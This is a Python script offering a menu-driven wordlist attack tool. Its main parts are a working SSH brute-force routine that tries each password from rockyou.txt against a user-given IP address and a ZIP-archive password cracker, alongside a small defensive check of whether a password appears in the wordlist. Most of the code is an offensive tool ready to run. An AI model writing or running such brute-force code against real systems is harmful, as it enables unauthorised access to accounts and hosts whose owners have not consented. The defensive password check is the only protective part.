# Purpose:                      Create a brute force attack.

import time  # Import time module for delays
import getpass  # Import getpass module to securely get user passwords
import os  # Import os module for file system operations
import paramiko  # Import paramiko for SSH connections
import zipfile  # Import zipfile for handling zip files

# Function to read lines from a file with optional delay
def read_file(filepath, delay=0):
    if not os.path.isfile(filepath):  # Check if the file exists
        print(f"File not found: {filepath}")
        return None
    with open(filepath, encoding="ISO-8859-1") as file:  # Open file with specified encoding
        for line in file:
            yield line.rstrip()  # Remove trailing whitespace and yield the line
            if delay:
                time.sleep(delay)  # Delay for specified time if delay is set

# Function to iterate through words in a dictionary file
def iterator():
    filepath = input("Enter your dictionary filepath:\n") or "rockyou.txt"
    for word in read_file(filepath, delay=1):  # Read file with 1-second delay between lines
        if word is None:
            return
        print(word)

# Function to check if a password is in a dictionary file
def check_password():
    usr_password = getpass.getpass(prompt="Please enter a password: ")
    usr_filepath = input("Enter a dictionary filepath:\n") or "rockyou.txt"
    wordlist = list(read_file(usr_filepath))  # Read file into a list
    if wordlist is None:
        return

    if usr_password not in wordlist:  # Check if password is not in wordlist
        print("Your password is acceptable. Good job.")
    else:
        print("Your password was found in the dictionary. Please choose another password.")

# Function to perform a brute force SSH attack
def brute_force_ssh():
    ip = input("Enter the target IP address:\n")
    username = input("Enter the SSH username:\n")
    filepath = input("Enter your dictionary filepath:\n") or "rockyou.txt"
    wordlist = read_file(filepath)
    if wordlist is None:
        return

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())  # Automatically add host key

    for password in wordlist:
        try:
            ssh.connect(ip, port=22, username=username, password=password, timeout=3)  # Attempt SSH connection
            print(f"Success! Username: {username} Password: {password}")
            break
        except paramiko.AuthenticationException:
            print(f"Failed: {password}")  # Print failed password
        except Exception as e:
            print(f"Connection error: {e}")
            break
    ssh.close()  # Close SSH connection

# Function to perform a brute force attack on a password-protected zip file
def brute_force_zip():
    zip_filepath = input("Enter the path to the password-protected zip file:\n")
    dict_filepath = input("Enter your dictionary filepath:\n") or "rockyou.txt"
    wordlist = read_file(dict_filepath)
    if wordlist is None:
        return

    with zipfile.ZipFile(zip_filepath) as zf:  # Open the zip file
        for password in wordlist:
            try:
                zf.extractall(pwd=bytes(password, 'utf-8'))  # Try to extract files with the password
                print(f"Success! Password: {password}")
                break
            except RuntimeError:
                print(f"Failed: {password}")  # Print failed password
            except zipfile.BadZipFile:
                print(f"Bad zip file: {zip_filepath}")
                break

# Main function to handle menu and user input
def main():
    while True:
        print("\nBrute Force Wordlist Attack Tool Menu")
        print("1 - Offensive, Dictionary Iterator")
        print("2 - Defensive, Password Recognized")
        print("3 - Offensive, SSH Brute Force")
        print("4 - Offensive, ZIP Brute Force")
        print("5 - Exit")
        
        mode = input("Please enter a number: ")
        if mode == "1":
            iterator()  # Call iterator function
        elif mode == "2":
            check_password()  # Call check_password function
        elif mode == "3":
            brute_force_ssh()  # Call brute_force_ssh function
        elif mode == "4":
            brute_force_zip()  # Call brute_force_zip function
        elif mode == "5":
            break  # Exit the loop
        else:
            print("Invalid selection...")  # Handle invalid input

if __name__ == "__main__":
    main()  # Run the main function if the script is executed directly
